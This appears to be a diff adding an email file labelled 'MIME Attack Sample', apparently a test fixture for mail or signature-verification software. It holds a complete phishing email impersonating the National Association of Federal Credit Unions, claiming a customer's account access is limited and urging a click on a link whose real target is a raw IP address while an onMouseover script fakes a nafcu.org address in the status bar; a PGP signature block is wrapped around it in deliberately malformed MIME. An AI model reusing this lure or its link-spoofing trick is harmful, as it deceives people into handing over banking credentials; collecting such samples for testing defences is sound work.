@@ -1,0 +1,120 @@
+From: matt.lorenz@enron.com
+To: e-service@sohu.com
+Subject: MIME Attack Sample
+Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature" 
+--BOUNDARY
+Content-Type: text/plain Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<title></title>
+<style type=3Dtext/css>
+<!--
+panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver;=
+ background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align=3D"center" width=3D"99%" border=3D0>
+<tr>
+
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class=3D"panel"><b></b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+	<TD><font color=3D"black" size=3D"3"><small><b>Dear FCU Customer</b></sma=
+ll> ,</font><br>
+	<br>
+<font face=3D"Arial" size=3D"2px"><b>National Association</b> of <b>Federa=
+l Credit Unions</b>(NAFCU) is constantly working to ensure security by reg=
+ularly screening the accounts in our system. <BR>We recently reviewed your=
+ account, and we need more information to help us provide you with secure =
+services. Until we collect this information, your access to sensitive acco=
+unt features will be limited. <BR>We would like to restore your access as =
+soon as possible, and we apologize for the inconvenience.
+<br>
+<br>
+          <br> <b>***</b> <i>Why is my account access limited?</i>
+
+<br>
+          <br>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your account access has been=
+ limited for the following reason(s):
+<br>
+<br>
+          <br> &nbsp;&nbsp;&nbsp;&nbsp; August 26, 2006: We have reason to=
+ believe that your account was accessed by a third party. Because protecti=
+ng the security of your account is our primary concern, we have limited ac=
+cess to sensitive &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;account features. We under=
+stand that this may be an inconvenience but please understand that this te=
+mporary limitation is for your protection.
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Your case ID for this reason is THEFT-3=
+150019066.)
+<br>
+<br>
+<br><b>***</b><i>How can I restore my account access?</i>
+<br>
+
+<br>&nbsp;&nbsp;&nbsp;&nbsp;To restore full access to your FCU online acco=
+unt click on the link below and complete the mandatory fields on our secur=
+e form.
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<B>Important Notice</b>: This link can be acce=
+ssed only from this message.
+<br>	
+       <br>&nbsp;&nbsp;&nbsp;&nbsp;<a href=3D"http://221.137.133.243/index=
+htm" onMouseover=3D"window.status=3D'https://www.nafcu.org/members/update=
+php'; return true">https://www.nafcu.org/members/update.php</a><br>
+
+
+        <br>
+<br>Once you complete all of the checklist items, your case will be review=
+ed by one of our Account Specialists. We will send you an email with the o=
+utcome of the review.
+
+<br>Thanks for your patience as we work together to protect your account
+	
+<br>
+        <br>
+	<b>Best regards</b>,<br>
+	- <i>National Association of Federal Credit Unions TEAM</i>.
+        </TD>
+        </tr>
+</TABLE>
+
+
+----425634058336498016487--
+Content-Disposition: attachment; filename=signature.asc
+--BOUNDARY
+Content-Type: application/pgp-signature; name="signature.asc" 
+
+-----BEGIN PGP SIGNATURE-----
+iQGzBAABCAAdFiEE+eYAclh4xtrjBojKS1aPSG6WD7UFAlxm1SEACgkQS1aPSG6W
+D7Vougv/a57PJh16psngj2NFLeDH8T43aiPfameEt/nVb7xWxGJoD3ZyOiLDoPCf
+j3hEVKI7KYxpx+AuaYHZsAPeB/uO3+IqgRVdC26stck/UXchPytLB5Tpjx3U3ITV
+KbqptyoxDLROdNu9XjIqcg3T1nxsx+vUw/hEuhH+AZYBMehK25gMrO1/iWpWcNpJ
+KQWL4HdSz0hHM40r2i5iJP1nbxInsleVJCzLBSGYqOEoYy8e4A1Se7+0ypMTZ4Ch
+w1fHoqMHhX3yj3b91wsflBYdIrpE5sU6XCN2gf2cW4L1BRtX/pIuTYAn8FMm2w6E
+M9OQiWE+jWEF6/En0XRjYgHUy+biV4T7YioP/ahie7GZQwdOZmYu6SkzjOlnrepf
+hFVbcS5nS6zqsAYQ2TxMTk4NcuLYwfNtGSf5NEc/1wOQY6lYLkQEIfs78wiGZkvz
+cND6jP43BoLBgd5CKRvcP6yryC73kHu5PFPuUkG0+OBQQqMJrxfA72sLpKrH3vl5
+Md2hf7yu
+=c7bP
+-----END PGP SIGNATURE-----
+--BOUNDARY--
